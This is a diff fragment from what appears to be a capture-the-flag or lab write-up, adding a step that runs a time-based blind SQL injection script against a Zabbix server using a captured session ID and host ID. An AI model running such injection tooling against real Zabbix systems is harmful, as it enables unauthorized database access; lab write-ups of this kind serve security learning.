@@ -204,3 +204,10 @@ Then ill decode the full string to just get the ID
 769725bb8e582ce30f3d2a3575da191d
 ```
 
+Now i can exploit this
+
+```python
+python3 zabbix_server_time_based_blind_sqli.py --ip zabbix.watcher.vl --sid 769725bb8e582ce30f3d2a3575da191d --hostid 10084 | grep '(+)'
+
+
+```
